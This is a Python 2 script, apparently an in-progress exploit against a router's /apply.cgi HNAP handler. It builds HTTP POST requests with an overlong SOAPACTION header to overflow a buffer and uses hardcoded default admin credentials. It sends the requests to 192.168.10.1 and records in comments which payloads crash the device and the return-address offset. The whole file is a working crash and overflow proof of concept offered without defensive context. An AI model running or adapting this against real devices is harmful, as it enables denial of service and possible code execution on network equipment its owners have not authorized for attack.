import socket
import struct


'''
4138 + XXXX in SoapAction value, right now only working with Exit address as sleep address has bad chars which 

disallows from using regular shellcode directly
'''

buf = "POST /apply.cgi HTTP/1.1\r\n"
buf+= "Host: 10.0.0.90\r\n"
#buf+="SOAPACTION:http://purenetworks.com/HNAP1/"+"\x18"+"zyw"*9+"\r\n" #ori test
#buf+="SOAPACTION:HNAP1"+"zyw"*800+"\r\n" #crash 
buf+="SOAPACTION:HNAP1"+"zyw"*33+"\r\n" # new test 
buf+="Authorization: Basic YWRtaW46YWRtaW4=\r\n"
'''
buf+="Proxy-Connection: keep-alive\r\n"
buf+="Cache-Control: max-age=0\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buf+="User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36\r\n"
buf+="Accept-Encoding: gzip,deflate,sdch\r\n"
buf+="Accept-Language: en-US,en;q=0.8\r\n"
buf+="Cookie: uid:1111;"+"\r\n"
#buf+="Cookie: uid:1111;"+"\r\n"
'''
buf+="Content-Length: 13\r\n\r\n123123123\r\n\r\n" #if too short ,cannot incur crash

buf2 = "POST /apply.cgi HTTP/1.1\r\n"


buf0 = "POST /apply.cgi HTTP/1.1\r\n"
buf0+= "Host: 10.0.0.190\r\n" 
buf0+="Proxy-Connection: keep-alive\r\n"
buf0+="Authorization: Basic YWRtaW46YWRtaW4=\r\n"
buf0+="Cache-Control: max-age=0\r\n"
buf0+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buf0+="User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36\r\n"
buf0+="Accept-Encoding: gzip,deflate,sdch\r\n"
buf0+="Accept-Language: en-US,en;q=0.8\r\n"
buf0+="Cookie: uid:1111;"+"\r\n"
buf0+="Content-Length: 13\r\n\r\ntest=test\r\n\r\n"

print "[+] sending buffer size", len(buf)
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.connect(("192.168.10.1", 80))
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect(("192.168.10.1", 80))
#s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s3.connect(("192.168.10.1", 80))
#s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s4.connect(("192.168.10.1", 80))
s2.send(buf2)
s1.send(buf)


#buf+buf0 crash
#buf+buf+buf+buf crash